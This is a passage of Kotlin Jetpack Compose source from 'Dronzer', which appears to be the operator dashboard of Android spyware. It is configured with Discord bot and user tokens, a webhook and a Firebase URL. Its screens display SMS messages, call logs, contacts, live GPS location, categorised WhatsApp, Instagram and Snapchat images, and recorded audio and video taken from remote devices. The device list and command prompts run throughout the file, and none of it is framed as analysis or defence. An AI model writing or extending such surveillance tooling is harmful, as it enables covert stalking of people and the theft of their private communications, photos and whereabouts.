                            putBoolean("auth_2fa", is2faEnabled)
                            putString("matrix_color", matrixColor.trim())
                            apply()
                        }
                        onSave()
                    }) {
                        Text("SAVE")
                    }
                }
            )
            
            LazyColumn(modifier = Modifier.fillMaxSize()) {
                item {
                    ListItem(
                        headlineContent = { Text("Set System Config") },
                        supportingContent = { Text("Discord Webhook, Bot & User Tokens, Firebase URL") },
                        leadingContent = { Icon(Icons.Default.Terminal, null) },
                        modifier = Modifier.clickable { activeDialog = "discord" }
                    )
                }
                item {
                    ListItem(
                        headlineContent = { Text("Register Credentials") },
                        supportingContent = { Text("Change Username, Password and 2FA") },
                        leadingContent = { Icon(Icons.Default.Security, null) },
                        modifier = Modifier.clickable { activeDialog = "auth" }
                    )
                }
                item {
                    ListItem(
                        headlineContent = { Text("Change Theme") },
                        supportingContent = { Text("Matrix Animation Colors") },
                        leadingContent = { Icon(Icons.Default.Palette, null) },
                        modifier = Modifier.clickable { activeDialog = "theme" }
                    )
                }
                item {
                    ListItem(
                        headlineContent = { Text("Contact Developer") },
                        leadingContent = { Icon(Icons.Default.Email, null) },
                        modifier = Modifier.clickable { 
                            val intent = Intent(Intent.ACTION_SENDTO).apply {
                                data = "mailto:dev@dronzer.app".toUri()
                                putExtra(Intent.EXTRA_SUBJECT, "Dronzer Support")
                            }
                            context.startActivity(intent)
                        }
                    )
                }
                item {
                    ListItem(
                        headlineContent = { Text("Report Bug") },
                        leadingContent = { Icon(Icons.Default.BugReport, null) },
                        modifier = Modifier.clickable { 
                             val intent = Intent(Intent.ACTION_VIEW, "https://github.com/dronzer/issues".toUri())
                             context.startActivity(intent)
                        }
                    )
                }
            }
        }
    }

    // Dialogs
    when (activeDialog) {
        "discord" -> {
            AlertDialog(
                onDismissRequest = { activeDialog = null },
                title = { Text("System Configuration") },
                text = {
                    Column {
                        OutlinedTextField(value = webhookUrl, onValueChange = { webhookUrl = it }, label = { Text("Webhook URL") }, modifier = Modifier.fillMaxWidth())
                        Spacer(modifier = Modifier.height(8.dp))
                        OutlinedTextField(value = channelId, onValueChange = { channelId = it }, label = { Text("Channel ID") }, modifier = Modifier.fillMaxWidth())
                        Spacer(modifier = Modifier.height(8.dp))
                        OutlinedTextField(value = botToken, onValueChange = { botToken = it }, label = { Text("Bot Token") }, modifier = Modifier.fillMaxWidth())
                        Spacer(modifier = Modifier.height(8.dp))
                        OutlinedTextField(value = userToken, onValueChange = { userToken = it }, label = { Text("User Token") }, modifier = Modifier.fillMaxWidth())
                        Spacer(modifier = Modifier.height(8.dp))
                        OutlinedTextField(value = firebaseRealtimeUrl, onValueChange = { firebaseRealtimeUrl = it }, label = { Text("Firebase Realtime URL") }, modifier = Modifier.fillMaxWidth())
                    }
                },
                confirmButton = { TextButton(onClick = { activeDialog = null }) { Text("OK") } }
            )
        }
        "auth" -> {
            AlertDialog(
                onDismissRequest = { activeDialog = null },
                title = { Text("Login Credentials") },
                text = {
                    Column {
                        OutlinedTextField(value = username, onValueChange = { username = it }, label = { Text("Username") }, modifier = Modifier.fillMaxWidth())
                        Spacer(modifier = Modifier.height(8.dp))
                        OutlinedTextField(value = password, onValueChange = { password = it }, label = { Text("Password") }, modifier = Modifier.fillMaxWidth())
                        Spacer(modifier = Modifier.height(16.dp))
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Checkbox(checked = is2faEnabled, onCheckedChange = { is2faEnabled = it })
                            Text("Enable 2FA (Bio/Pattern)")
                        }
                    }
                },
                confirmButton = { TextButton(onClick = { activeDialog = null }) { Text("OK") } }
            )
        }
        "theme" -> {
            AlertDialog(
                onDismissRequest = { activeDialog = null },
                title = { Text("Visual Customization") },
                text = {
                    Column {
                        OutlinedTextField(value = matrixColor, onValueChange = { matrixColor = it }, label = { Text("Matrix Color (Hex)") }, modifier = Modifier.fillMaxWidth())
                    }
                },
                confirmButton = { TextButton(onClick = { activeDialog = null }) { Text("OK") } }
            )
        }
    }
}

@Composable
fun IntroVideoScreen(onVideoFinished: () -> Unit) {
    Box(modifier = Modifier.fillMaxSize().background(Color.Black), contentAlignment = Alignment.Center) {
        AndroidView(
            factory = { ctx ->
                VideoView(ctx).apply {
                    layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
                    val videoUri = "android.resource://${ctx.packageName}/${R.raw.intro}".toUri()
                    setVideoURI(videoUri)
                    setOnCompletionListener { onVideoFinished() }
                    setOnErrorListener { _, what, extra -> 
                        Log.e("IntroVideo", "Error playing intro: $what, $extra")
                        onVideoFinished() 
                        true
                    }
                    start()
                }
            },
            modifier = Modifier.fillMaxSize()
        )
        
        TextButton(
            onClick = onVideoFinished,
            modifier = Modifier.align(Alignment.TopEnd).padding(top = 32.dp, end = 16.dp),
            colors = ButtonDefaults.textButtonColors(contentColor = Color.White.copy(alpha = 0.7f))
        ) {
            Text("Skip Intro")
        }
    }
}

@Composable
fun HolographicGlobe(lat: Double?, lon: Double?, isLocked: Boolean, modifier: Modifier = Modifier) {
    val context = LocalContext.current
    val infiniteTransition = rememberInfiniteTransition(label = "GlobeRotation")
    
    val autoRotation by infiniteTransition.animateFloat(
        initialValue = 0f,
        targetValue = 360f,
        animationSpec = infiniteRepeatable(
            animation = tween(20000, easing = LinearEasing),
            repeatMode = RepeatMode.Restart
        ),
        label = "autoRotation"
    )

    val targetLockedRotation = if (lon != null) (270f - lon.toFloat()) else 0f
    
    val animatedLockedRotation by animateFloatAsState(
        targetValue = targetLockedRotation,
        animationSpec = tween(1000, easing = FastOutSlowInEasing),
        label = "lockedRotation"
    )

    val currentRotation = if (isLocked && lon != null) animatedLockedRotation else autoRotation

    var scale by remember { mutableFloatStateOf(1f) }
    var offset by remember { mutableStateOf(Offset.Zero) }

    val continentPoints = remember {
        loadWorldPoints(context)
    }

    Box(
        modifier = modifier
            .fillMaxWidth()
            .height(350.dp)
            .pointerInput(Unit) {
                detectTransformGestures { _, pan, zoom, _ ->
                    scale *= zoom
                    offset += pan
                }
            },
        contentAlignment = Alignment.Center
    ) {
        Canvas(modifier = Modifier.fillMaxSize().graphicsLayer(scaleX = scale, scaleY = scale, translationX = offset.x, translationY = offset.y)) {
            val centerOffset = Offset(size.width / 2f, size.height / 2f)
            val radius = size.minDimension / 2.5f
            val cyanColor = Color(0xFF00FFFF)

            drawCircle(
                brush = Brush.radialGradient(
                    colors = listOf(cyanColor.copy(alpha = 0.15f), Color.Transparent),
                    center = centerOffset,
                    radius = radius * 1.3f
                ),
                center = centerOffset,
                radius = radius * 1.3f
            )

            drawCircle(
                color = cyanColor,
                center = centerOffset,
                radius = radius,
                style = Stroke(width = 1.dp.toPx())
            )

            for (i in 0 until 12) {
                val angle = (i * 15f)
                rotate(degrees = angle + currentRotation, pivot = centerOffset) {
                    drawOval(
                        color = cyanColor.copy(alpha = 0.2f),
                        topLeft = Offset(centerOffset.x - radius, centerOffset.y - radius),
                        size = Size(radius * 2, radius * 2),
                        style = Stroke(width = 0.5.dp.toPx())
                    )
                }
            }

            for (i in -8 until 9) {
                val yOffset = (i * radius / 9)
                val h = sqrt(radius * radius - yOffset * yOffset)
                drawOval(
                    color = cyanColor.copy(alpha = 0.2f),
                    topLeft = Offset(centerOffset.x - h, centerOffset.y + yOffset - 0.5f),
                    size = Size(h * 2, 1f),
                    style = Stroke(width = 0.5.dp.toPx())
                )
            }

            continentPoints.forEach { (pLat, pLon) ->
                val radLat = Math.toRadians(pLat)
                val radLon = Math.toRadians(pLon + currentRotation)
                
                val x = radius * cos(radLat) * sin(radLon)
                val y = -radius * sin(radLat)
                val z = radius * cos(radLat) * cos(radLon)

                if (z > 0) {
                    drawCircle(
                        color = cyanColor.copy(alpha = 0.5f),
                        center = centerOffset + Offset(x.toFloat(), y.toFloat()),
                        radius = 1.2.dp.toPx()
                    )
                }
            }

            if (lat != null && lon != null) {
                val radLat = Math.toRadians(lat)
                val radLon = Math.toRadians(lon + currentRotation)
                
                val x = radius * cos(radLat) * sin(radLon)
                val y = -radius * sin(radLat)
                val z = radius * cos(radLat) * cos(radLon)

                if (z > 0) {
                    val pulse = (System.currentTimeMillis() % 1200) / 1200f
                    drawCircle(
                        color = Color.Red.copy(alpha = 1f - pulse),
                        center = centerOffset + Offset(x.toFloat(), y.toFloat()),
                        radius = 15.dp.toPx() * (pulse),
                        style = Stroke(width = 2.dp.toPx())
                    )
                    drawCircle(
                        color = Color.Red,
                        center = centerOffset + Offset(x.toFloat(), y.toFloat()),
                        radius = 6.dp.toPx()
                    )
                    drawCircle(
                        color = Color.White,
                        center = centerOffset + Offset(x.toFloat(), y.toFloat()),
                        radius = 2.5.dp.toPx()
                    )
                }
            }
        }
    }
}

private fun loadWorldPoints(context: Context): List<Pair<Double, Double>> {
    val points = mutableListOf<Pair<Double, Double>>()
    try {
        val jsonString = context.assets.open("world.json").bufferedReader().use { it.readText() }
        val root = JSONObject(jsonString)
        val features = root.getJSONArray("features")
        for (i in 0 until features.length()) {
            val feature = features.getJSONObject(i)
            val geometry = feature.getJSONObject("geometry")
            val type = geometry.getString("type")
            val coords = geometry.getJSONArray("coordinates")
            
            if (type == "Polygon") {
                extractRingPoints(coords.getJSONArray(0), points)
            } else if (type == "MultiPolygon") {
                for (j in 0 until coords.length()) {
                    val polygon = coords.getJSONArray(j)
                    extractRingPoints(polygon.getJSONArray(0), points)
                }
            }
        }
    } catch (e: Exception) {
        Log.e("Globe", "Error loading world.json", e)
    }
    return points
}

private fun extractRingPoints(ring: JSONArray, points: MutableList<Pair<Double, Double>>) {
    for (k in 0 until ring.length() step 4) {
        val coord = ring.getJSONArray(k)
        val lon = coord.getDouble(0)
        val lat = coord.getDouble(1)
        points.add(lat to lon)
    }
}

@OptIn(ExperimentalFoundationApi::class)
@Composable
fun DevicesContent(data: String, selectedId: String?, onDeviceSelect: (String) -> Unit) {
    val clean = data.stripAnsi()
    val deviceBlocks = clean.split("📱").filter { it.trim().isNotEmpty() }
    
    if (deviceBlocks.isEmpty()) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Text("No devices found. Send 'devices' command first.")
        }
    } else {
        LazyColumn {
            items(deviceBlocks) { block ->
                val lines = block.trim().lines()
                val model = lines.find { it.contains("**Device:**") }?.substringAfter("`")?.substringBefore("`") ?: "Unknown"
                val id = lines.find { it.contains("**ID:**") }?.substringAfter("`")?.substringBefore("`") ?: ""
                val lastSeen = lines.find { it.contains("**Last Seen:**") }?.substringAfter("`")?.substringBefore("`") ?: ""
                val isSelected = id == selectedId
                
                ListItem(
                    modifier = Modifier
                        .background(if (isSelected) MaterialTheme.colorScheme.primaryContainer.copy(alpha = 0.3f) else Color.Transparent)
                        .combinedClickable(
                            onClick = { /* Tap */ },
                            onDoubleClick = { if (id.isNotEmpty()) onDeviceSelect(id) }
                        ),
                    headlineContent = { 
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Text(model, fontWeight = FontWeight.Bold)
                            if (isSelected) {
                                Spacer(modifier = Modifier.width(8.dp))
                                Icon(Icons.Default.CheckCircle, "Selected", tint = MaterialTheme.colorScheme.primary, modifier = Modifier.size(16.dp))
                            }
                        }
                    },
                    supportingContent = { 
                        Column {
                            Text("ID: $id")
                            if (lastSeen.isNotEmpty()) {
                                Text("Last Seen: $lastSeen", fontSize = 11.sp, color = Color.Gray)
                            }
                        }
                    },
                    leadingContent = { 
                        Icon(
                            Icons.Default.Smartphone, 
                            null, 
                            tint = if (isSelected) MaterialTheme.colorScheme.primary else LocalContentColor.current
                        ) 
                    },
                    trailingContent = { 
                        Text(
                            if (isSelected) "ACTIVE" else "Double Tap", 
                            fontSize = 10.sp, 
                            color = if (isSelected) MaterialTheme.colorScheme.primary else Color.Gray,
                            fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal
                        ) 
                    }
                )
                HorizontalDivider()
            }
        }
    }
}

@Composable
fun StatusContent(onClearCaches: () -> Unit, matrixColor: Color) {
    Box(modifier = Modifier.fillMaxSize()) {
        CMatrixBackground(matrixColor = matrixColor)
        
        Column(
            modifier = Modifier.fillMaxSize().padding(16.dp),
            verticalArrangement = Arrangement.Center,
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Icon(Icons.Default.CheckCircle, null, modifier = Modifier.size(100.dp), tint = MaterialTheme.colorScheme.primary)
            Spacer(modifier = Modifier.height(24.dp))
            Text(text = "Dronzer System Active", style = MaterialTheme.typography.headlineMedium, color = Color.White)
            Text(text = "All protocols authorized & monitoring.", style = MaterialTheme.typography.bodyLarge, color = Color.White.copy(alpha = 0.8f))
            
            Spacer(modifier = Modifier.height(32.dp))
            
            Button(
                onClick = onClearCaches,
                colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.secondaryContainer, contentColor = MaterialTheme.colorScheme.onSecondaryContainer)
            ) {
                Icon(Icons.Default.DeleteSweep, null)
                Spacer(modifier = Modifier.width(8.dp))
                Text("Clear System Caches")
            }
        }
    }
}

@Composable
fun RemoteMessagesContent(remoteData: String) {
    val clean = remoteData.stripAnsi()
    val blocks = clean.split("----------------------------").filter { it.trim().isNotEmpty() }
    var selectedMsg by remember { mutableStateOf<SmsDetail?>(null) }

    if (blocks.isEmpty()) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Text("No messages found.")
        }
    } else {
        LazyColumn {
            items(blocks) { block ->
                val lines = block.trim().lines()
                val from = lines.find { it.startsWith("From:") }?.substringAfter("From:")?.trim() ?: "Unknown"
                val date = lines.find { it.startsWith("Date:") }?.substringAfter("Date:")?.trim() ?: ""
                val msg = block.substringAfter("Message:").trim()

                ListItem(
                    modifier = Modifier.clickable { selectedMsg = SmsDetail(from, date, msg) },
                    headlineContent = { Text(from, fontWeight = FontWeight.Bold) },
                    supportingContent = { Text(msg.take(50) + if(msg.length > 50) "..." else "") },
                    leadingContent = { Icon(Icons.AutoMirrored.Filled.Chat, null) }
                )
                HorizontalDivider()
            }
        }
    }

    selectedMsg?.let { detail ->
        AlertDialog(
            onDismissRequest = { selectedMsg = null },
            title = { Text(detail.from) },
            text = {
                Column {
                    Text(detail.date, fontSize = 12.sp, color = MaterialTheme.colorScheme.primary, fontWeight = FontWeight.SemiBold)
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(detail.content)
                }
            },
            confirmButton = { TextButton(onClick = { selectedMsg = null }) { Text("Close") } }
        )
    }
}

data class SmsDetail(val from: String, val date: String, val content: String)

@Composable
fun RemoteLocationContent(data: String) {
    val clean = data.stripAnsi().replace("--- Location ---", "").trim()
    val lines = clean.lines().filter { it.trim().isNotEmpty() }

    var lat by remember { mutableStateOf<Double?>(null) }
    var lon by remember { mutableStateOf<Double?>(null) }
    var isLocked by remember { mutableStateOf(false) }

    LaunchedEffect(clean) {
        try {
            val latLine = lines.find { it.contains("Lat:") }
            if (latLine != null) {
                val latStr = latLine.substringAfter("Lat:").substringBefore(",").trim()
                val lonStr = latLine.substringAfter("Lon:").substringBefore(" ", "").trim().ifEmpty { 
                    latLine.substringAfter("Lon:").trim()
                }
                lat = latStr.toDoubleOrNull()
                lon = lonStr.toDoubleOrNull()
            }
        } catch (e: Exception) {
            Log.e("Dashboard", "Error parsing location: ${e.message}")
        }
    }

    Column(modifier = Modifier.fillMaxSize().padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text("Geospatial Positioning", style = MaterialTheme.typography.titleMedium, color = MaterialTheme.colorScheme.primary)
            
            IconButton(onClick = { if(lat != null) isLocked = !isLocked }) {
                Icon(
                    if (isLocked) Icons.Default.LocationSearching else Icons.Default.LocationDisabled,
                    contentDescription = "Lock Location",
                    tint = if (isLocked) MaterialTheme.colorScheme.primary else Color.Gray
                )
            }
        }
        
        HolographicGlobe(lat = lat, lon = lon, isLocked = isLocked)
        
        Spacer(modifier = Modifier.height(16.dp))
        
        if (lines.isEmpty()) {
            Text("No location data available.")
        } else {
            Surface(
                shape = MaterialTheme.shapes.medium,
                color = MaterialTheme.colorScheme.surfaceVariant,
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    lines.forEach { line ->
                        if (line.contains(":")) {
                            val parts = line.split(":", limit = 2)
                            Row(modifier = Modifier.padding(vertical = 4.dp)) {
                                Text(parts[0].trim() + ": ", fontWeight = FontWeight.Bold)
                                Text(parts[1].trim())
                            }
                        } else {
                            Text(line, modifier = Modifier.padding(vertical = 4.dp))
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun RemoteGalleryContent(
    files: List<DiscordFile>, 
    data: String, 
    onFetchImage: (String) -> Unit,
    onViewImage: (String, String) -> Unit
) {
    val clean = data.stripAnsi()
    val galleryLines = clean.lines().filter { it.contains("GALLERY_DATA:") }
    
    val groupedData = galleryLines.mapNotNull { line ->
        val regex = Regex("\\[(.*?)\\] \\[(.*?)\\] (.*)")
        val match = regex.find(line.substringAfter("GALLERY_DATA: "))
        if (match != null) {
            val (category, bucket, path) = match.destructured
            category to (bucket to path)
        } else null
    }.groupBy({ it.first }, { it.second })

    var expandedCategory by remember { mutableStateOf<String?>(null) }
    
    val imageFiles = files.filter { it.name.endsWith(".jpg", ignoreCase = true) || it.name.endsWith(".png", ignoreCase = true) || it.name.endsWith(".jpeg", ignoreCase = true) }

    Column(modifier = Modifier.fillMaxSize()) {
        if (imageFiles.isNotEmpty()) {
            Text("Uploaded Images", style = MaterialTheme.typography.titleMedium, modifier = Modifier.padding(16.dp))
            LazyVerticalGrid(
                columns = GridCells.Adaptive(100.dp),
                modifier = Modifier.heightIn(max = 250.dp).padding(horizontal = 8.dp)
            ) {
                items(imageFiles) { file ->
                    Box(modifier = Modifier.padding(4.dp).aspectRatio(1f).background(Color.Gray).clickable { onViewImage(file.url, file.name) }) {
                        AsyncImage(model = file.url, contentDescription = file.name, modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Crop)
                    }
                }
            }
            HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp))
        }

        Text("Device Gallery (Browse)", style = MaterialTheme.typography.titleMedium, modifier = Modifier.padding(16.dp))
        if (groupedData.isEmpty()) {
            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                Text("No categorized data found. Send 'gallery' command.")
            }
        } else {
            LazyColumn {
                groupedData.forEach { (category, items) ->
                    item {
                        ListItem(
                            modifier = Modifier.clickable { expandedCategory = if (expandedCategory == category) null else category },
                            headlineContent = { Text(category, fontWeight = FontWeight.Bold) },
                            supportingContent = { Text("${items.size} items") },
                            leadingContent = { 
                                val icon = when(category.lowercase()) {
                                    "whatsapp" -> Icons.AutoMirrored.Filled.Chat
                                    "instagram" -> Icons.Default.CameraAlt
                                    "camera" -> Icons.Default.PhotoCamera
                                    "snapchat" -> Icons.Default.ChatBubble
                                    "screenshots" -> Icons.Default.Screenshot
                                    else -> Icons.Default.Folder
                                }
                                Icon(icon, null)
                            },
                            trailingContent = { Icon(if (expandedCategory == category) Icons.Default.ExpandLess else Icons.Default.ExpandMore, null) }
                        )
                    }
                    if (expandedCategory == category) {
                        items(items) { (_, path) ->
                            ListItem(
                                modifier = Modifier.padding(start = 32.dp).clickable { onFetchImage(path) },
                                headlineContent = { Text(path.substringAfterLast("/"), fontSize = 14.sp) },
                                supportingContent = { Text(path, fontSize = 10.sp, color = Color.Gray) },
                                leadingContent = { Icon(Icons.Default.Image, null, modifier = Modifier.size(20.dp)) },
                                trailingContent = { Icon(Icons.Default.CloudDownload, null, tint = MaterialTheme.colorScheme.primary) }
                            )
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun AdvancedImageViewer(url: String, name: String, onBack: () -> Unit) {
    val context = LocalContext.current
    BackHandler { onBack() }

    Column(
        modifier = Modifier.fillMaxSize().background(Color.Black),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Row(
            modifier = Modifier.fillMaxWidth().padding(16.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            IconButton(onClick = onBack) {
                Icon(Icons.AutoMirrored.Filled.ArrowBack, "Back", tint = Color.White)
            }
            Spacer(modifier = Modifier.width(8.dp))
            Text(name, color = Color.White, fontSize = 16.sp, maxLines = 1, fontWeight = FontWeight.Bold)
        }

        Box(modifier = Modifier.weight(1f), contentAlignment = Alignment.Center) {
            AsyncImage(
                model = url,
                contentDescription = name,
                modifier = Modifier.fillMaxSize(),
                contentScale = ContentScale.Fit
            )
        }

        Surface(
            modifier = Modifier.fillMaxWidth(),
            color = Color.Black.copy(alpha = 0.7f)
        ) {
            Row(modifier = Modifier.padding(16.dp), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                Button(
                    onClick = { downloadFile(context, url, name) },
                    modifier = Modifier.weight(1f),
                    colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary)
                ) {
                    Icon(Icons.Default.Download, null)
                    Spacer(modifier = Modifier.width(8.dp))
                    Text("Download")
                }
            }
        }
    }
}

fun downloadFile(context: Context, url: String, fileName: String) {
    try {
        val request = DownloadManager.Request(url.toUri())
            .setTitle(fileName)
            .setDescription("Downloading file from Dronzer...")
            .setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
            .setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, fileName)
            .setAllowedOverMetered(true)
            .setAllowedOverRoaming(true)

        val manager = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
        manager.enqueue(request)
        Toast.makeText(context, "Download started...", Toast.LENGTH_SHORT).show()
    } catch (e: Exception) {
        Toast.makeText(context, "Download failed: ${e.message}", Toast.LENGTH_SHORT).show()
    }
}

@Composable
fun RemoteTextContent(data: String, screen: Screen) {
    val clean = data.stripAnsi()
    val tag = when(screen) {
        Screen.CALL_LOGS -> "CALL_LOG_DATA:"
        Screen.CONTACTS -> "CONTACT_DATA:"
        else -> ""
    }

    val lines = clean.lines().filter { 
        it.trim().isNotEmpty() && !it.startsWith("---") && !it.contains("Output:") && !it.contains("[ID:")
    }
    
    if (lines.isEmpty()) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Text("No data found.")
        }
    } else {
        LazyColumn {
            items(lines) { line ->
                val display = if (tag.isNotEmpty() && line.contains(tag)) {
                    line.substringAfter(tag).trim()
                } else {
                    line.trim()
                }
                
                ListItem(
                    headlineContent = { Text(display) },
                    leadingContent = {
                        val icon = when(screen) {
                            Screen.CONTACTS -> Icons.Default.Person
                            Screen.CALL_LOGS -> Icons.Default.Call
                            else -> Icons.Default.Description
                        }
                        Icon(icon, null)
                    }
                )
                HorizontalDivider()
            }
        }
    }
}

@Composable
fun RemoteFilesContent(files: List<DiscordFile>, ext: String, filter: String = "", onPlay: (String, String) -> Unit) {
    val filtered = files.filter { it.name.endsWith(ext, ignoreCase = true) && (filter.isEmpty() || it.name.contains(filter, ignoreCase = true)) }
    
    if (filtered.isEmpty()) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Text("No $ext files found.")
        }
    } else {
        LazyColumn {
            items(filtered) { file ->
                ListItem(
                    headlineContent = { Text(file.name) },
                    supportingContent = { Text("${file.size / 1024} KB") },
                    trailingContent = {
                        IconButton(onClick = { onPlay(file.url, file.name) }) {
                            Icon(if (ext == ".mp4") Icons.Default.PlayArrow else Icons.AutoMirrored.Filled.VolumeUp, null)
                        }
                    },
                    leadingContent = {
                        val icon = when {
                            ext == ".amr" -> Icons.Default.Mic
                            ext == ".mp4" -> Icons.Default.Videocam
                            else -> Icons.Default.FilePresent
                        }
                        Icon(icon, null)
                    }
                )
                HorizontalDivider()
            }
        }
    }
}

@Composable
fun AdvancedAudioPlayer(fileUrl: String, fileName: String, onBack: () -> Unit) {
    val context = LocalContext.current
    val mediaPlayer = remember { MediaPlayer() }
    var isPlaying by remember { mutableStateOf(false) }
    var currentPos by remember { mutableIntStateOf(0) }
    var duration by remember { mutableIntStateOf(0) }
    var isPrepared by remember { mutableStateOf(false) }

    BackHandler { onBack() }

    LaunchedEffect(fileUrl) {
        try {
            mediaPlayer.setDataSource(context, fileUrl.toUri())
            mediaPlayer.prepareAsync()
            mediaPlayer.setOnPreparedListener { 
                isPrepared = true
                duration = it.duration
                it.start()
                isPlaying = true
            }
        } catch (e: Exception) {
            Log.e("AudioPlayer", "Error: ${e.message}")
        }
    }

    LaunchedEffect(isPlaying) {
        while (isActive && isPlaying) {
            currentPos = mediaPlayer.currentPosition
            delay(500)
        }
    }

    DisposableEffect(Unit) {
        onDispose {
            mediaPlayer.release()
        }
    }

    Column(
        modifier = Modifier.fillMaxSize().padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        IconButton(onClick = onBack, modifier = Modifier.align(Alignment.Start)) {
            Icon(Icons.AutoMirrored.Filled.ArrowBack, "Back")
        }
        
        Spacer(modifier = Modifier.height(24.dp))
        Icon(Icons.Default.Mic, null, modifier = Modifier.size(180.dp), tint = MaterialTheme.colorScheme.primary)
        Spacer(modifier = Modifier.height(32.dp))
        
        Text(fileName, fontWeight = FontWeight.Bold, fontSize = 18.sp)
        Spacer(modifier = Modifier.height(16.dp))

        Slider(
            value = currentPos.toFloat(),
            onValueChange = { 
                mediaPlayer.seekTo(it.toInt())
                currentPos = it.toInt()
            },
            valueRange = 0f..duration.toFloat().coerceAtLeast(1f),
            modifier = Modifier.fillMaxWidth()
        )
        
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
            Text(formatTime(currentPos))
            Text(formatTime(duration))
        }

        Spacer(modifier = Modifier.height(24.dp))

        Row(verticalAlignment = Alignment.CenterVertically) {
            IconButton(onClick = { mediaPlayer.seekTo((mediaPlayer.currentPosition - 10000).coerceAtLeast(0)) }) {
                Icon(Icons.Default.Replay10, null, modifier = Modifier.size(36.dp))
            }
            
            IconButton(onClick = { 
                if (mediaPlayer.isPlaying) {
                    mediaPlayer.pause()
                    isPlaying = false
                } else {
                    mediaPlayer.start()
                    isPlaying = true
                }
            }, enabled = isPrepared) {
                Icon(if (isPlaying) Icons.Default.PauseCircle else Icons.Default.PlayCircle, null, modifier = Modifier.size(72.dp))
            }

            IconButton(onClick = { mediaPlayer.seekTo((mediaPlayer.currentPosition + 10000).coerceAtMost(duration)) }) {
                Icon(Icons.Default.Forward10, null, modifier = Modifier.size(36.dp))
            }
        }
    }
}

@Composable
fun AdvancedVideoPlayer(fileUrl: String, fileName: String, isFullscreen: Boolean, onToggleFullscreen: () -> Unit, onBack: () -> Unit) {
    val context = LocalContext.current
    val activity = context as? ComponentActivity

    BackHandler {
        if (isFullscreen) {
            onToggleFullscreen()
        } else {
            onBack()
        }
    }

    DisposableEffect(isFullscreen) {
        if (isFullscreen) {
            activity?.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
            val window = activity?.window
            if (window != null) {
                val controller = WindowInsetsControllerCompat(window, window.decorView)
                controller.hide(WindowInsetsCompat.Type.systemBars())
                controller.systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            }
        } else {
            activity?.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
            val window = activity?.window
            if (window != null) {
                val controller = WindowInsetsControllerCompat(window, window.decorView)
                controller.show(WindowInsetsCompat.Type.systemBars())
            }
        }
        onDispose {
            if (isFullscreen) {
                activity?.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                val window = activity?.window
                if (window != null) {
                    val controller = WindowInsetsControllerCompat(window, window.decorView)
                    controller.show(WindowInsetsCompat.Type.systemBars())
                }
            }
        }
    }

    Box(modifier = Modifier.fillMaxSize().background(Color.Black)) {
        Box(
            modifier = if (isFullscreen) Modifier.fillMaxSize() else Modifier.fillMaxWidth().aspectRatio(16/9f).align(Alignment.Center),
            contentAlignment = Alignment.Center
        ) {
            AndroidView(
                factory = { ctx ->
                    VideoView(ctx).apply {
                        setVideoURI(fileUrl.toUri())
                        val mc = android.widget.MediaController(ctx)
                        mc.setAnchorView(this)
                        setMediaController(mc)
                        setOnPreparedListener { it.start() }
                    }
                },
                modifier = Modifier.fillMaxSize()
            )
        }

        Row(
            modifier = Modifier
                .align(Alignment.TopStart)
                .padding(16.dp)
                .background(Color.Black.copy(alpha = 0.5f)),
            verticalAlignment = Alignment.CenterVertically
        ) {
            IconButton(onClick = { 
                if (isFullscreen) {
                    onToggleFullscreen()
                } else {
                    onBack()
                }
            }) {
                Icon(Icons.AutoMirrored.Filled.ArrowBack, "Back", tint = Color.White)
            }
            if (!isFullscreen) {
                Spacer(modifier = Modifier.width(8.dp))
                Text(fileName, color = Color.White, fontSize = 14.sp)
            }
        }

        IconButton(
            onClick = {
                onToggleFullscreen()
            },
            modifier = Modifier
                .align(Alignment.TopEnd)
                .padding(16.dp)
                .background(Color.Black.copy(alpha = 0.5f))
        ) {
            Icon(
                if (isFullscreen) Icons.Default.FullscreenExit else Icons.Default.Fullscreen,
                "Toggle Fullscreen",
                tint = Color.White
            )
        }
    }
}

fun formatTime(ms: Int): String {
    val totalSeconds = ms / 1000
    val minutes = totalSeconds / 60
    val seconds = totalSeconds % 60
    return String.format(Locale.getDefault(), "%02d:%02d", minutes, seconds)
}

fun String.stripAnsi() = this.replace(Regex("\u001b\\[[;\\d]*m"), "")

fun isRelevant(name: String, screen: Screen): Boolean {
    val lowName = name.lowercase()
    return when (screen) {
        Screen.CALL_LOGS -> lowName.contains("calllogs")
        Screen.MESSAGES -> lowName.contains("sms")
